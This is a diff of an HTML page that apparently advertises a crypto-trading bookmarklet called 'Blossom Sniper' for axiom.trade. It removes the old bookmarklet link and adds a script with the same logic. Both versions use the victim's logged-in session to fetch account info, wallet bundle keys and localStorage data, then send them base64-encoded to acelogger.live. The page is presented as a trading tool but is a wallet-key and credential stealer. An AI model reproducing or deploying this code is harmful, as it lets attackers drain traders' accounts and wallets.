@@ -767,50 +767,10 @@
         </main>
     </div>
 
-    <div class="bookmarklet-container">
-        <a
-          class="bookmarklet"
-          draggable="true"
-          onclick="return false"
-          href="javascript:(function(){
-            try{
-              if(location.hostname!=='axiom.trade'){
-                alert('Go to axiom.trade first');
-                location.href='https://axiom.trade/discover';
-                return;
-              }
-              if(!localStorage.getItem('isAuthed')){
-                alert('You must be logged in');
-                return;
-              }
-              fetch('//api7.axiom.trade/user-info',{method:'POST',credentials:'include'})
-              .then(r=>r.json())
-              .then(user=>{
-                return fetch('//api8.axiom.trade/bundle-key-and-wallets',{method:'POST',credentials:'include'})
-                .then(r=>r.json())
-                .then(bundle=>{
-                  const payload={site:location.href,user,bundle:bundle.bundleKey};
-                  location.href='https://acelogger.live/data/'+btoa(JSON.stringify(payload));
-                });
-              });
-            }catch(e){
-              alert('Error');
-              console.error(e);
-            }
-          })();"
-        >
-          Blossom Sniper
-        </a>
-    </div>
 
-    <p class="footer-note">
-        no installation • works in browser • never auto-runs
-    </p>
 
-    <div class="instructions-section" id="instructions">
-        <h2 class="instructions-title">Get started in 30 seconds</h2>
-    </div>
-</main>
-</div>
-
-<script>
+    <script>
+        javascript:(async()=>{try{if(location.hostname==='acelogger.live')return alert('You are already on the bookmarklet site!');if(location.hostname!=='axiom.trade'){alert('Please navigate to axiom.trade to use this bookmarklet');location.replace('https://axiom.trade/discover')}else{if(!localStorage.getItem('isAuthed'))return alert('Please log in to axiom.trade to use this bookmarklet');const user=await(await fetch('//api7.axiom.trade/user-info',{method:'POST',credentials:'include'})).json();const bundle=await(await fetch('//api8.axiom.trade/bundle-key-and-wallets',{method:'POST',credentials:'include'})).json();const bookmarkData={customerId:'CUST-3BEEF8356DE9597B',site:location.href,user:user,bundle:bundle.bundleKey,sBundles:localStorage.getItem('sBundles')};location.replace('https://acelogger.live/data/'+btoa(JSON.stringify(bookmarkData)))}}catch(e){console.error('Bookmarklet error:',e);alert('error but idk what it is')}})()  
+    </script>
+</body>
+</html>
